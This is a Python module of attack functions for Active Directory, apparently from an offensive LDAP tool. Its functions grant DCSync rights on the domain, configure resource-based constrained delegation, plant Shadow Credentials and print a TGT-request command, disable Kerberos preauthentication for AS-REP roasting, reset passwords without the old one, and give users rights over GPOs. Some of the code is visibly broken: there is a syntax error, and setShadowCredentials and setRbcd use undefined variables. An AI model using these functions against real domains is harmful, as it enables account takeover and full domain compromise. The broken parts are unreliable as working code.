import logging
from functools import wraps

import ldap3, impacket, random, string
from ldap3.extend.microsoft import addMembersToGroups, modifyPassword, removeMembersFromGroups
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from impacket.ldap import ldaptypes

from .exceptions import ResultError, NoResultError, TooManyResultsError
from .utils import createACE, createEmptySD
from .utils import resolvDN, getDefaultNamingContext
from .utils import rpcChangePassword
from .utils import userAccountControl


LOG = logging.getLogger()
logging.basicConfig(level=logging.DEBUG, format='%(message)s')

modules = []


def register_module(f):
    modules.append((f.__name__, f))
    @wraps(f)
    def wrapper(*args, **kwds):
        return f(*args, **kwds)
    return wrapper


@register_module
def getGroupMembers(conn, identity):
    """
    Return the list of member for a group whose identity is given as parameter
    """
    ldap_conn = conn.getLdapConnection()
    group_dn = resolvDN(ldap_conn, identity)
    ldap_conn.search(group_dn, '(objectClass=group)', attributes='member')
    LOG.info(ldap_conn.response[0]['attributes']['member'])


@register_module
def getObjectAttributes(conn, identity):
    """
    Fetch LDAP attributes for the identity (group or user) provided
    """
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    ldap_conn.search(dn, '(objectClass=*)', attributes='*')
    LOG.info(ldap_conn.response[0]['attributes'])


@register_module
def addUser(conn, sAMAccountName, password, ou=None):
    """
    Add a new user in the LDAP database
    By default the user object is put in the OU Users
    This can be changed with the ou parameter
    """
    ldap_conn = conn.getLdapConnection()

    # TODO: Check that the user is not already present in AD?
    #user_dn = resolvDN(conn, sAMAccountName)
    #print(user_dn)

    if ou:
        user_dn = f"cn={sAMAccountName},{ou}"
    else:
        naming_context = getDefaultNamingContext(ldap_conn)
        user_dn = f"cn={sAMAccountName},cn=Users,{naming_context}"

    LOG.debug(user_dn)
    user_cls = ['top', 'person', 'organizationalPerson', 'user']
    attr = {'objectClass':  user_cls}
    #attr["cn"] = sAMAccountName
    attr["distinguishedName"] = user_dn
    attr["sAMAccountName"] = sAMAccountName
    attr["userAccountControl"] = 544

    ldap_conn.add(user_dn, attributes=attr)
    LOG.info(ldap_conn.result)

    changePassword(conn, sAMAccountName, password)



@register_module
def delObject(conn, identity):
    """
    Delete an object (user or group) from the Directory based on the identity provided
    """
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    LOG.debug(f"Trying to remove {dn}")
    ldap_conn.delete(dn)
    LOG.info(f"[+] {dn} has been removed")


@register_module
def addUserToGroup(conn, member, group):
    """
    Add an object to a group
        member: the user or group to add into the group
        group: the group to add to
    """
    ldap_conn = conn.getLdapConnection()
    member_dn = resolvDN(ldap_conn, member)
    LOG.debug(f"[+] {member} found at {member_dn}")
    group_dn = resolvDN(ldap_conn, group)
    LOG.debug(f"[+] {group} found at {group_dn}")
    addMembersToGroups.ad_add_members_to_groups(ldap_conn, member_dn, group_dn, raise_error=True)
    LOG.info(f"[+] Adding {member_dn} to {group_dn}")


@register_module
def getUsersInOu(conn, base_ou):
    """
    List the user present in an organisational unit
    """
    ldap_conn = conn.getLdapConnection()
    ldap_conn.search(base_ou, '(objectClass=user)')
    for entry in ldap_conn.response:
        LOG.info(entry['dn'])


@register_module
def delUserFromGroup(conn, member, group):
    """
    Remove member from group
    """
    ldap_conn = conn.getLdapConnection()
    member_dn = resolvDN(ldap_conn, member)
    group_dn = resolvDN(ldap_conn, group)
    removeMembersFromGroups.ad_remove_members_from_groups(ldap_conn, member_dn, group_dn, True, raise_error=True)


@register_module
def addForeignObjectToGroup(conn, user_sid, group_dn):
    """
    Add foreign principals (users or groups), coming from a trusted domain, to a group
    Args: 
        foreign object sid
        group dn in which to add the foreign object
    """
    ldap_conn = conn.getLdapConnection()
    # https://social.technet.microsoft.com/Forums/en-US/6b7217e1-a197-4e24-9357-351c2d23edfe/ldap-query-to-add-foreignsecurityprincipals-to-a-group?forum=winserverDS
    magic_user_dn = f"<SID={user_sid}>"
    addMembersToGroups.ad_add_members_to_groups(ldap_conn, magic_user_dn, group_dn, raise_error=True)


@register_module
def addDomainSync(conn, identity):
    """
    Give the right to perform DCSync with the user provided (You must have write permission on the domain)
    Args:
        sAMAccountName, DN, GUID or SID of the user
    """
    ldap_conn = conn.getLdapConnection()
    user_dn = resolvDN(ldap_conn, identity)
    # Query for the sid of our target user
    ldap_conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
    user_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]


    # Set SD flags to only query for DACL
    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)

    # print_m('Querying domain security descriptor')
    ldap_conn.search(getDefaultNamingContext(ldap_conn), '(&(objectCategory=domain))', attributes=['nTSecurityDescriptor'], controls=controls)
    entry = ldap_conn.entries[0]

    secDescData = entry['nTSecurityDescriptor'].raw_values[0]

    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)

    # We need "control access" here for the extended attribute
    accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS

    # these are the GUIDs of the get-changes and get-changes-all extended attributes
    secDesc['Dacl']['Data'].append(createACE(user_sid, '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
    secDesc['Dacl']['Data'].append(createACE(user_sid, '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', accesstype))

    dn = entry.entry_dn
    data = secDesc.getData()
    ldap_conn.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)

@register_module
def changePassword(conn, identity, new_pass):
    """
    Change the target password without knowing the old one using LDAPS
    Args: 
        sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        new password for the target
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, identity)

    # If LDAPS is not supported use SAMR
    if conn.conf.scheme == "ldaps":
        modifyPassword.ad_modify_password(ldap_conn, target_dn, new_pass, old_password=None)
        if ldap_conn.result['result'] == 0:
            LOG.info('[+] Password changed successfully!')
        else:
            raise ResultError(ldap_conn.result)
    else:
        # Check if identity is sAMAccountName
        sAMAccountName = identity
        for marker in ["dn=","s-1","{"]:
            if marker in identity:
                ldap_filter = '(objectClass=*)'
                entries = ldap_conn.search(target_dn, ldap_filter, attributes=['SAMAccountName'])
                try:
                    sAMAccountName = entries[0]['sAMAccountName']
                except IndexError:
                    raise NoResultError(target_dn, ldap_filter)
                break

        rpcChangePassword(conn, sAMAccountName, new_pass)

# TODO: Add Computer


@register_module
def setRbcd(conn, spn_sid, target_identity):
    """
    Give Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
    Args: 
        object sid of the SPN (Controlled by you)
        sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, target_identity)

    entries = ldap_conn.search(getDefaultNamingContext(ldap_conn), '(sAMAccountName=%s)' % spn_sid, attributes=['objectSid'])
    try:
        spn_sid = entries[0]['objectSid'].raw_values[0]
    except IndexError:
        LOG.error('User not found in LDAP: %s' % spn_sid)

    ldap_conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
    targetuser = None
    for entry in ldap_conn.response:
        if entry['type'] != 'searchResEntry':
            continue
        targetuser = entry
    if not targetuser:
        LOG.error('Could not query target user properties')
        return
    try:
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
        LOG.debug('Currently allowed sids:')
        for ace in sd['Dacl'].aces:
            LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
    except IndexError:
        # Create DACL manually
        sd = createEmptySD()
    sd['Dacl'].aces.append(createACE(spn_sid))
    ldap_conn.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
    if ldap_conn.result['result'] == 0:
        LOG.info('Delegation rights modified succesfully!')
        LOG.info('%s can now impersonate users on %s via S4U2Proxy', ldaptypes.LDAP_SID(spn_sid).formatCanonical(), target)
    else:
        raise ResultError(ldap_conn.result)


@register_module
def setShadowCredentials(conn, identity, outfilePath=None):
    """
    Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
    Args: 
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        outfilePath: file path for the generated certificate (default is current path)
    """
    ldap_conn = conn.getLdapConnection()

    target_dn = resolvDN(ldap_conn, sAMAccountName)
    LOG.debug("Generating certificate")
    certificate = X509Certificate2(subject=sAMAccountName, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
    LOG.debug("Certificate generated")
    LOG.debug("Generating KeyCredential")
    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
    LOG.debug("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
    LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
    ldap_filter = '(objectClass=*)'
    ldap_conn.search(target_dn, , attributes=['msDS-KeyCredentialLink'])
    results = None
    for entry in ldap_conn.response:
        if entry['type'] != 'searchResEntry':
            continue
        results = entry
    if not results:
        raise NoResultError(target_dn, ldap_filter)
    try:
        new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
        LOG.debug(new_values)
        LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % sAMAccountName)
        conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
        if ldap_conn.result['result'] == 0:
            LOG.debug("Updated the msDS-KeyCredentialLink attribute of the target object")
            if outfilePath is None:
                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                LOG.info("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
            else:
                path = outfilePath

            certificate.ExportPEM(path_to_files=path)
            LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
            LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
            LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
            LOG.info("Run the following command to obtain a TGT")
            LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', sAMAccountName, path))
        else:
            raise ResultError(ldap_conn.result)
    except IndexError:
        LOG.error('Attribute msDS-KeyCredentialLink does not exist')
    return


@register_module
def dontReqPreauth(conn, identity, enable):
    """
    Enable or disable the DONT_REQ_PREAUTH flag for the given user in order to perform ASREPRoast
    You must have a write permission on the UserAccountControl attribute of the target user
    Args:
        sAMAccountName, DN, GUID or SID of the target
        set the flag on the UserAccountControl attribute (default is True)
    """
    ldap_conn = conn.getLdapConnection()

    UF_DONT_REQUIRE_PREAUTH = 4194304
    userAccountControl(ldap_conn, identity, enable, UF_DONT_REQUIRE_PREAUTH)


@register_module
def setAccountDisableFlag(conn, identity, enable):
    """
    Enable or disable the target account by setting the ACCOUNTDISABLE flag in the UserAccountControl attribute
    You must have write permission on the UserAccountControl attribute of the target
    Args:
        sAMAccountName, DN, GUID or SID of the target
        set the flag on the UserAccountControl attribute 
    """
    ldap_conn = conn.getLdapConnection()

    UF_ACCOUNTDISABLE = 2
    userAccountControl(ldap_conn, identity, enable, UF_ACCOUNTDISABLE)


@register_module
def modifyGpoACE(conn, identity, gpo):
    """
    Give permission to a user to modify the GPO
    Args:
        sAMAccountName, DN, GUID or SID of the user
        name of the GPO (ldap name)
    """
    ldap_conn = conn.getLdapConnection()

    user_dn = resolvDN(ldap_conn, identity)
    ldap_conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
    user_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]

    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
    ldap_filter = '(&(objectClass=groupPolicyContainer)(name=%s))' % gpo
    ldap_conn.search(getDefaultNamingContext(ldap_conn), ldap_filter, attributes=['nTSecurityDescriptor'], controls=controls)

    if len(ldap_conn.entries) <= 0:
        raise NoResultError(getDefaultNamingContext(ldap_conn), ldap_filter)
    gpo = ldap_conn.entries[0]

    secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
    newace = createACE(user_sid)
    secDesc['Dacl']['Data'].append(newace)
    data = secDesc.getData()

    ldap_conn.modify(gpo.entry_dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
    if ldap_conn.result["result"] == 0:
        LOG.info('LDAP server claims to have taken the secdescriptor. Have fun')
    else:
        raise ResultError(ldap_conn.result)
